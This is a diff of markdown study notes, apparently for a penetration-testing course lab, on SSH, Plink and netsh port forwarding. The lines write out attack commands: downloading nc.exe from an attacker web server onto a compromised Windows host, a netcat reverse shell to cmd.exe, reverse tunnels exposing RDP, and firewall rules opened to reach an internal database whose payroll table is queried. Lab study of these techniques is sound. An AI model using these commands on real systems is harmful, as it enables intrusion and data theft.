@@ -1550,19 +1550,19 @@ Reference
   - check SSH server on kali is listening
     `sudo ss -ntplu`
   - reverse shell to confluence + TTY shell
-  - to connect back kali, need to explicity allow password-based authentication
+  - to connect back kali, need to explicity allow password-based authentication  
     `PasswordAuthentication to yes in /etc/ssh/sshd_config`   
-  - listen on port 2345 on kali and forward traffic to DB port 5432
+  - listen on port 2345 on kali and forward traffic to DB port 5432  
     `ssh -N -R 127.0.0.1:2345:10.4.114.215:5432 kali@192.168.45.250`
-  - checking if port 2345 is bound on the kali ssh server >  127.0.0.1:2345 
+  - checking if port 2345 is bound on the kali ssh server >  127.0.0.1:2345  
     `ss -ntplu`
-  - Listing databases on the PGDATABASE01, using psql through the SSH remote port forward
+  - Listing databases on the PGDATABASE01, using psql through the SSH remote port forward  
     `kali@kali:~$ psql -h 127.0.0.1 -p 2345 -U postgres` `postgres=# \l`
-  - Connect to 'DB hr_backup'
+  - Connect to 'DB hr_backup'  
     `\c hr_backup`
-  - List out all tables
+  - List out all tables  
     `\dt`
-  - query data
+  - query data  
     'SELECT * FROM payroll;'
 - SSH Tunneling (remote dynamic port forward)
   - Remote dynamic port forwarding is just another instance of dynamic port forwarding, so we gain all the flexibility of traditional dynamic port forwarding. We can connect to any port on any host that CONFLUENCE01 has access to by passing SOCKS-formatted packets.
@@ -1601,44 +1601,44 @@ Reference
 - Port Forwarding with windows tool Plink
   - MULTISERVER03 is already “pre-compromised”. Browse /umbraco/forms.aspx on MULTISERVER03 to run arbitrary commands
   - Starting Apache2  `kali@kali:~$ sudo systemctl start apache2`
-  - Copying nc.exe to the Apache2 webroot
+  - Copying nc.exe to the Apache2 webroot  
     `find / -name nc.exe 2>/dev/null` `sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/`  
   - payload is downloaded from our Apache2 server to C:\Windows\Temp\nc.exe on MULTISERVER03.  
     `powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\Windows\Temp\nc.exe`
   - The Netcat listener on our Kali machine `kali@kali:~$ nc -nvlp 4446`
-  - The nc.exe reverse shell payload we execute in the web shell  > c:\windows\system32\inetsrv>
+  - The nc.exe reverse shell payload we execute in the web shell  > c:\windows\system32\inetsrv>  
     `C:\Windows\Temp\nc.exe -e cmd.exe 192.168.118.4 4446`
-  - Copying plink.exe to our Apache2 webroot
+  - Copying plink.exe to our Apache2 webroot  
     `kali@kali:~$ find / -name plink.exe 2>/dev/null` `kali@kali:~$ sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/`  
-  - Plink downloaded to the C:folder
+  - Plink downloaded to the C:folder  
     `c:\windows\system32\inetsrv>powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe`
-  - using Plink (PuTTY Link) to create an SSH reverse tunnel from a victim windows machine back to your attacker-controlled SSH server at 192.168.118.4 (reverse tunnel: binds 127.0.0.1:9833 on SSH server, forwards 3389 on victim)
+  - using Plink (PuTTY Link) to create an SSH reverse tunnel from a victim windows machine back to your attacker-controlled SSH server at 192.168.118.4 (reverse tunnel: binds 127.0.0.1:9833 on SSH server, forwards 3389 on victim)  
     `c:\windows\system32\inetsrv>C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4`
-  - OR automatically confirm a host key confirmation:
+  - OR automatically confirm a host key confirmation:  
     `cmd.exe /c echo y | ..exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7`
-  - Connecting to the RDP server with xfreerdp, through the Plink port forward
+  - Connecting to the RDP server with xfreerdp, through the Plink port forward  
     `kali@kali:~$ xfreerdp3 /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833`
-- Port Forwarding with windows tool Netsh (needs admin)
-  - built-in firewall configuration tool Netsh (also known as Network Shell).
-  - CONFLUENCE01 is no longer accessible. MULTISERVER03 is serving its web application on TCP port 80
-  - RDP directly into MULTISERVER03 from  Kali
+- Port Forwarding with windows tool Netsh (needs admin)  
+  - built-in firewall configuration tool Netsh (also known as Network Shell).  
+  - CONFLUENCE01 is no longer accessible. MULTISERVER03 is serving its web application on TCP port 80  
+  - RDP directly into MULTISERVER03 from  Kali  
     `kali@kali:~$ xfreerdp3 /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64`
-  - instruct netsh interface to add a portproxy rule from an IPv4 listener that is forwarded to an IPv4 port (v4tov4). This will listen on port 2222 on the external-facing interface (listenport=2222 listenaddress=192.168.50.64) and forward packets to port 22 on PGDATABASE01 (connectport=22 connectaddress=10.4.50.215). > no output receive but port open
+  - instruct netsh interface to add a portproxy rule from an IPv4 listener that is forwarded to an IPv4 port (v4tov4). This will listen on port 2222 on the external-facing interface (listenport=2222 listenaddress=192.168.50.64) and forward packets to port 22 on PGDATABASE01 (connectport=22 connectaddress=10.4.50.215). > no output receive but port open  
     `C:\Windows\system32>netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215`
-  - netstat showing that TCP/2222 is listening on the external interface. > 192.168.50.64:2222
+  - netstat showing that TCP/2222 is listening on the external interface. > 192.168.50.64:2222  
     `C:\Windows\system32>netstat -anp TCP | find "2222"`
-  - Listing all the portproxy port forwarders set up with Netsh
+  - Listing all the portproxy port forwarders set up with Netsh  
     `C:\Windows\system32>netsh interface portproxy show all`
-  - We can’t connect to port 2222 from （FW block) > filtered
+  - We can’t connect to port 2222 from （FW block) > filtered  
     `sudo nmap -sS 192.168.50.64 -Pn -n -p2222`
-  - Poking a hole in the Windows Firewall with Netsh
+  - Poking a hole in the Windows Firewall with Netsh  
     `C:\Windows\system32> netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow`
-  - SSHing into PGDATABASE01 through the Netsh port forward
+  - SSHing into PGDATABASE01 through the Netsh port forward  
     `kali@kali:~$ ssh database_admin@192.168.50.64 -p2222`
-  - Deleting the firewall rule with Netsh
+  - Deleting the firewall rule with Netsh  
     `C:\Users\Administrator>netsh advfirewall firewall delete rule name="port_forward_ssh_2222"`
   - Deleting the port forwarding rule with Netsh
-    `C:\Windows\Administrator> netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64`
+    `C:\Windows\Administrator> netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64`  
 
 ### 20. Tunneling through deep packet inspectation
 ### 21. The metassploit framework
